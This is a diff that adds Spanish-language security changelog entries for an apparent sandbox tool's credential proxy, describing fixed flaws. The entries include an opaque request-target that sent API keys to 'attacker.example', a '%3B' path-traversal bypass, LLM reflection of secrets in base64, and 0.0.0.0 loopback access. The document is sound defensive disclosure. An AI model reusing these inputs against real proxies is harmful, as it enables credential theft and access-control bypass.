@@ -167,6 +167,57 @@ y [`ext/sandbox/CHANGELOG.md`](ext/sandbox/CHANGELOG.md).
 
 ### Seguridad
 
+- **Proxy de credenciales: la clave ya no sale hacia otro host.** Un request-target
+  opaco (`GET http:@attacker.example/x` con `Host: api.stripe.com`) elegía la
+  credencial por el `Host`, pero la URL saliente se montaba pegando el request-target
+  tras `https://`+host: salía hacia `https://api.stripe.com@attacker.example/x`, con TLS
+  verificado contra el atacante, las cabeceras ya sustituidas y sin pasar por la
+  allowlist. Ahora la salida se monta por campos (`https`, el Host, la ruta y la query)
+  y un request-target opaco, con usuario, con otro esquema, hacia otro host o que no
+  empiece por `/` es un 400 sin leer el cuerpo ni abrir la salida.
+- **Proxy de credenciales: el marcador ya no se cambia en el cuerpo ni en la query
+  por defecto.** Se cambiaba en toda la petición, y un proveedor que refleja lo que
+  recibe (un LLM: "repite kling-cred-… en base64 / con espacios") devolvía la clave de
+  una forma que el redactor no reconocía. Ahora solo en `Authorization` (también
+  dentro de un `Basic`) y `X-Api-Key`; `-header X` (`headers`) añade cabeceras,
+  `-query` (`query`) la query y `-body` (`body`) el cuerpo, documentado como inseguro
+  frente a un proveedor que refleje. El redactor reconoce además la clave en
+  mayúsculas/minúsculas, hex, base64 (std/url, con y sin padding, también desalineada)
+  y escapada como ruta o userinfo. **Incompatible**: una credencial que se usaba en
+  otra cabecera, en `?key=` o en el cuerpo hay que volver a darla con `-header`,
+  `-query` o `-body`. En macOS el daemon exige un `kling-vz` que anuncie `http-places`.
+- **`-allow-request`: `%3B` y las dobles codificaciones ya no se saltan el rechazo de
+  rutas ambiguas.** `/public/..%3B/admin` casaba con `GET /public/**` y salía como
+  `/public/..;/admin` (`/admin` para Tomcat o Spring). La ruta se mira también
+  decodificada: `;`, `%` restante (`%252e`), `\`, `//`, caracteres de control y
+  segmentos `.`/`..` son 403.
+- **Rangos bloqueados de salida: `0.0.0.0/8`, `224.0.0.0/4` y `240.0.0.0/4`** en el
+  proxy de credenciales y en el firewall de Linux (macOS ya los tenía). Hacia 0.0.0.0
+  el dialer del daemon llegaba al loopback del host. `credproxy.IsBlockedIP` rechaza
+  además IPv6 sin especificar, loopback, link-local, ULA, multicast, NAT64 y 6to4 (la
+  salida sigue siendo solo IPv4).
+- **Una clave de menos de 8 bytes se rechaza** al registrar la credencial (máquina,
+  plantilla, arista de grafo y `kling-vz`), con un error que dice por qué: se aceptaba
+  de 1 byte y el redactor la cambiaba en toda la respuesta (con `abc`, `abcdef` llegaba
+  como `kling-cred-…def`). **Incompatible**: una máquina cuyo almacén guarde una clave más
+  corta no recibe sus credenciales al arrancar o despertar (el error lo dice) hasta
+  rotarla con `kling machine credential` y la misma `-env`.
+- **El cuerpo con la clave ya no se derrama a `/tmp`.** El directorio de derrame del
+  proxy (un cuerpo grande con Content-Length, con la clave real dentro) salía de la
+  variable `KLING_ROOT`, que el daemon no tiene (recibe `-root`): en la instalación
+  normal el fichero iba a `os.TempDir()` y se quedaba ahí si el daemon moría. Ahora es
+  `<raíz>/credtmp` en Linux y `credtmp/` del directorio de la máquina en macOS, 0700 y
+  vaciado al arrancar; sin directorio, `pkg/credproxy` no escribe a disco (sale
+  chunked).
+- **El registro de auditoría ya no pierde registros al rotar sin contarlos.** Rotaba a
+  1 MiB con una sola generación que pisaba la anterior sin sumar nada a `dropped`: de
+  20 000 peticiones quedaban 9 185 con `dropped=0`. Ahora rota a 4 MiB con 3
+  generaciones (`.1` a `.3`, ~80 000 peticiones), configurables con
+  `daemon.credaudit_max_mib`, `daemon.credaudit_generations` o
+  `KLING_CREDAUDIT=MIB:N` (también en macOS, que se lo pasa a `kling-vz`); las líneas
+  de la generación que se cae se suman a `dropped` y al campo nuevo `rotated`, `kling
+  machine audit` lo dice (`dropped N records (M rotated out...)`) y
+  `GET /machines/{ref}/credaudit` lee todas las generaciones.
 - **macOS: el sandbox de `kling-vz` ya no deja a una máquina tocar las de las demás.**
   Leía toda la raíz (también `secrets/snapshot.key`, de la que salen las claves de todos
   los `credentials.enc`), escribía en `snapshots/` y `volumes/` enteros y conectaba a
